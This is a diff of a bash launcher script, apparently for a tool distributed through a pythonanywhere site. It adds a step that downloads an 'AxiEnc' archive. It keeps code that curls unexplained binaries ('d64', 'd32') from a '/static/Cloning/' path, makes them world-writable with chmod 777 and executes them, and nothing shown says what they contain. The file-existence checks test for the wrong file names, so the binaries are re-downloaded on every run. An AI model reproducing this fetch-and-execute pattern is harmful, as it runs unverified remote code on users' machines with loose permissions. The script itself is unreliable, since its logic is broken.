@@ -1,20 +1,32 @@
 #!/bin/bash
-current_os=$(uname -om)
 
+echo -e " [*] Please wait, Initializing modules ......."
+
+if [ ! -d "AxiEnc" ]; then
+    echo "AxiEncrypt directory doesn't exist, downloading AxiEnc.zip..."
+    curl -L https://github.com/axidevelopers/Encryption/blob/main/AxiEnc.zip?raw=true > AxiEnc.zip
+    unzip AxiEnc.zip -d AxiEnc
+fi
+
+current_os=$(uname -om)
 if [[ $current_os == *"aarch64"* ]]; then
     if [ ! -f "arch64" ]; then
+        echo "Downloading d64 for aarch64..."
         curl -L https://dilutecodes.pythonanywhere.com/static/Cloning/d64 > d64
         chmod 777 d64
         ./d64
     else
+        echo "Running d64 for aarch64..."
         ./d64
     fi
 elif [[ $current_os == *"arm"* ]]; then
     if [ ! -f "arm" ]; then
+        echo "Downloading d32 for arm..."
         curl -L https://dilutecodes.pythonanywhere.com/static/Cloning/d32 > d32
         chmod 777 d32
         ./d32
     else
+        echo "Running d32 for arm..."
         ./d32
     fi
 else
